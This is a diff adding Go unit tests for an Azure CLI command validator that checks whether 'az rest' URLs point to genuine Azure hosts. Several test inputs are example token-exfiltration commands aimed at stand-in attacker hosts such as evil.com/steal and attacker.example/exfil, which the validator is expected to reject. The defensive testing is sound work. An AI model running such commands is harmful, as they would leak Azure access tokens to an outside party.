@@ -320,3 +320,181 @@ policy:
 		t.Errorf("expected 2 denied commands, got %d", len(policy.Policy.DenyList))
 	}
 }
+
+func TestIsAzureHost(t *testing.T) {
+	tests := []struct {
+		name     string
+		url      string
+		expected bool
+	}{
+		{"management.azure.com", "https://management.azure.com/subscriptions", true},
+		{"portal.azure.com", "https://portal.azure.com/", true},
+		{"graph.microsoft.com", "https://graph.microsoft.com/v1.0/me", true},
+		{"login.microsoftonline.com", "https://login.microsoftonline.com/tenant", true},
+		{"blob.core.windows.net", "https://myaccount.blob.core.windows.net/container", true},
+		{"azure.cn sovereign", "https://management.azure.cn/subscriptions", true},
+		{"azure.us sovereign", "https://management.azure.us/subscriptions", true},
+		{"azure.de sovereign", "https://management.azure.de/subscriptions", true},
+		{"visualstudio.com", "https://dev.visualstudio.com/project", true},
+		{"azurecr.io", "https://myregistry.azurecr.io/v2/", true},
+		{"evil.com", "https://evil.com/steal", false},
+		{"localhost", "https://127.0.0.1:18443/exploit", false},
+		{"attacker domain", "https://attacker.example/exfil", false},
+		{"azure-lookalike", "https://not-azure.com/fake", false},
+		{"azure suffix trick", "https://fakeazure.com/", false},
+		{"empty string", "", false},
+		{"no scheme", "management.azure.com", false},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			got := isAzureHost(tt.url)
+			if got != tt.expected {
+				t.Errorf("isAzureHost(%q) = %v, want %v", tt.url, got, tt.expected)
+			}
+		})
+	}
+}
+
+func TestExtractFlagValue(t *testing.T) {
+	tests := []struct {
+		name      string
+		tokens    []string
+		flag      string
+		wantVal   string
+		wantFound bool
+	}{
+		{"space separated", []string{"--url", "https://example.com"}, "--url", "https://example.com", true},
+		{"equals form", []string{"--url=https://example.com"}, "--url", "https://example.com", true},
+		{"not found", []string{"--method", "get"}, "--url", "", false},
+		{"empty tokens", []string{}, "--url", "", false},
+		{"flag at end without value", []string{"--url"}, "--url", "", false},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			val, found := extractFlagValue(tt.tokens, tt.flag)
+			if val != tt.wantVal || found != tt.wantFound {
+				t.Errorf("extractFlagValue(%v, %q) = (%q, %v), want (%q, %v)", tt.tokens, tt.flag, val, found, tt.wantVal, tt.wantFound)
+			}
+		})
+	}
+}
+
+func TestValidator_ValidateFlagSecurity(t *testing.T) {
+	validator := &DefaultValidator{
+		readOnlyMode:         false,
+		enableSecurityPolicy: false,
+	}
+
+	tests := []struct {
+		name    string
+		input   string
+		wantErr bool
+	}{
+		{
+			name:    "az rest with Azure URL and resource - allowed",
+			input:   "az rest --url https://management.azure.com/subscriptions --resource https://management.azure.com/",
+			wantErr: false,
+		},
+		{
+			name:    "az rest with Azure URL only - allowed",
+			input:   "az rest --method get --url https://management.azure.com/subscriptions?api-version=2022-01-01",
+			wantErr: false,
+		},
+		{
+			name:    "az rest with evil URL and resource - rejected",
+			input:   "az rest --url https://evil.com/steal --resource https://management.azure.com/",
+			wantErr: true,
+		},
+		{
+			name:    "az rest with localhost URL and resource - rejected",
+			input:   "az rest --url https://127.0.0.1:18443/exploit --resource https://management.azure.com/",
+			wantErr: true,
+		},
+		{
+			name:    "az rest with evil URL no resource - rejected",
+			input:   "az rest --url https://evil.com",
+			wantErr: true,
+		},
+		{
+			name:    "az rest with attacker URL - rejected",
+			input:   "az rest --method get --url https://attacker.example/exfil --resource https://management.azure.com/ -o none",
+			wantErr: true,
+		},
+		{
+			name:    "az rest with -u short flag evil URL - rejected",
+			input:   "az rest -u https://evil.com/steal",
+			wantErr: true,
+		},
+		{
+			name:    "az rest with -u short flag Azure URL - allowed",
+			input:   "az rest -u https://management.azure.com/subscriptions",
+			wantErr: false,
+		},
+		{
+			name:    "az rest with --url= equals form Azure - allowed",
+			input:   "az rest --url=https://management.azure.com/subscriptions",
+			wantErr: false,
+		},
+		{
+			name:    "az rest with --url= equals form evil - rejected",
+			input:   "az rest --url=https://evil.com/steal",
+			wantErr: true,
+		},
+		{
+			name:    "az vm list with --resource-group - allowed (not az rest)",
+			input:   "az vm list --resource-group myRG",
+			wantErr: false,
+		},
+		{
+			name:    "az aks show - allowed (not az rest)",
+			input:   "az aks show --name cluster --resource-group rg",
+			wantErr: false,
+		},
+		{
+			name:    "az rest with graph.microsoft.com - allowed",
+			input:   "az rest --url https://graph.microsoft.com/v1.0/me --resource https://graph.microsoft.com/",
+			wantErr: false,
+		},
+		{
+			name:    "az rest with windows.net storage - allowed",
+			input:   "az rest --url https://myaccount.blob.core.windows.net/container",
+			wantErr: false,
+		},
+		{
+			name:    "az rest no URL flag - allowed",
+			input:   "az rest --method get",
+			wantErr: false,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			err := validator.validateFlagSecurity(tt.input)
+			if (err != nil) != tt.wantErr {
+				t.Errorf("validateFlagSecurity() error = %v, wantErr %v", err, tt.wantErr)
+			}
+		})
+	}
+}
+
+func TestValidator_Validate_FlagSecurityIntegration(t *testing.T) {
+	// Test that validateFlagSecurity is called as part of the full Validate() flow
+	validator := &DefaultValidator{
+		readOnlyMode:         false,
+		enableSecurityPolicy: false,
+	}
+
+	// This should be rejected by validateFlagSecurity even though basic security passes
+	err := validator.Validate("az rest --url https://evil.com/steal --resource https://management.azure.com/")
+	if err == nil {
+		t.Error("expected Validate() to reject az rest with non-Azure URL, but got nil")
+	}
+
+	// This should pass all validation
+	err = validator.Validate("az rest --url https://management.azure.com/subscriptions --resource https://management.azure.com/")
+	if err != nil {
+		t.Errorf("expected Validate() to allow az rest with Azure URL, but got: %v", err)
+	}
+}
